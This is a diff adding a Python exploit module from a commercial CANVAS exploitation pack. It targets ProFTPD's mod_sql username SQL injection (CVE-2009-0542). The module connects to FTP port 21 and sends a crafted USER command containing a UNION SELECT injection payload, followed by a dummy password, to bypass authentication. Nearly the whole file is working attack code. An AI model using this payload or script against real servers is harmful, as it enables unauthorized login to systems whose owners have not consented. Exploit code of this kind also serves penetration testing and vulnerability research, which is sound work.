@@ -1,0 +1,97 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import os, sys, string, base64
+
+sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import canvasengine
+
+
+NAME = 'd2sec_proftpd_modsql'
+DESCRIPTION = 'Exploits mod_sql Username SQL Injection Vulnerability'
+
+VERSION='0.1'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = 'ProFTPD'
+DOCUMENTATION["Repeatability"] = 'Infinite'
+DOCUMENTATION['Date public'] = '2009/12/02'
+DOCUMENTATION['References'] = 'http://www.securityfocus.com/bid/33722'
+DOCUMENTATION['Versions Affected'] = '1.3.1 < x < 1.3.2rc2'
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = 'CVE-2009-0542'
+DOCUMENTATION["CVE Url"] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0542'
+DOCUMENTATION["Notes"] = ''
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [ ['Linux'] ]
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 21
+    self.tableuser = 'users'
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port', self.port))
+    self.tableuser = self.argsDict.get('tableuser', self.tableuser)
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
+    self.log('[D2] Attacking %s:%d' % (self.host, self.port))
+    nfo = ''
+    s = self.gettcpsock()
+    s.set_timeout(10)
+    s.connect((self.host, self.port))
+    nfo = s.recv(1024)
+    if 'proftp' not in nfo.lower():
+      self.log('[D2] FTP server is not a ProFTPD server')
+      self.setInfo('[D2] %s attacking %s:%d (failed!)' % (NAME, self.host, self.port))
+      return 0
+    self.log('%s' % nfo)
+    try:
+      s.send("USER %\') and 1=2 union select 1,1,uid,gid,homedir,shell from %s; --\r\n" % self.tableuser)
+      if not nfo:
+        self.log('[D2] %s is not vulnerable' % self.host)
+        return 0
+      nfo = s.recv(1024)
+      if nfo and '331' not in nfo:
+        self.log('[D2] %s' % nfo)
+        return 0
+      s.send('PASS 1\r\n')
+      nfo = s.recv(1024)
+      if nfo and '230' not in nfo:
+        self.log('[D2] %s is not vulnerable' % self.host)
+        return 0
+    except Exception, e:
+      self.log('[D2] %s is not vulnerable' % self.host)
+      return 0
+    self.setInfo('[D2] %s attacking %s:%d (succeeded!)' % (NAME, self.host, self.port))
+    self.log('[D2] %s is vulnerable !' % self.host)
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -t host -p port [-O tableuser:<users>]' % sys.argv[0]
+    sys.exit(0)
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
